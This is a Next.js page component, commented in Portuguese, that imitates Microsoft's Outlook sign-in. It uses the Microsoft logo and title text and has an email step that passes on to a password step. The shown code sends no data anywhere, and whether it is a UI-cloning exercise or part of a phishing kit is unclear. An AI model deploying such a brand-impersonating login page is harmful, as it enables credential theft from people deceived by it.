"use client";

import Head from "next/head";
import { useState } from "react";
import EmailLogin from "./components/step1";
import PasswordLogin from "./components/step2";
import styles from "./page.module.css";

export default function Page() {
  const [step, setStep] = useState(1); // Controle do step
  const [email, setEmail] = useState(""); // Armazena o email

  const handleNextStep = () => {
    setStep(2); // Avança para o próximo step
  };

  return (
    <>
      <Head>
        <title>Entre na sua conta Microsoft</title>
        <meta name="description" content="Outlook Login Page" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div className={styles.container}>
        <main className={styles.main}>
          <div className={styles.loginContainer}>
            <div className={styles.logo}>
              <img src="/logoMicrosoft.svg" alt="Microsoft Logo" />
            </div>
            {step === 1 ? (
              <>
                <h2 className={styles.title}>Entrar</h2>
                <EmailLogin
                  setEmail={setEmail}
                  onNext={handleNextStep} // Função para ir para o próximo componente
                />
              </>
            ) : (
              <PasswordLogin email={email} />
            )}
          </div>
        </main>
        {step === 1 ? (
          <>
            <div className={styles.options}>
              <button>
                <img src="/key.svg" alt="Options Icon" width="32" height="32" />
                <span>Opções de entrada</span>
              </button>
            </div>
          </>
        ) : null}
      </div>
    </>
  );
}
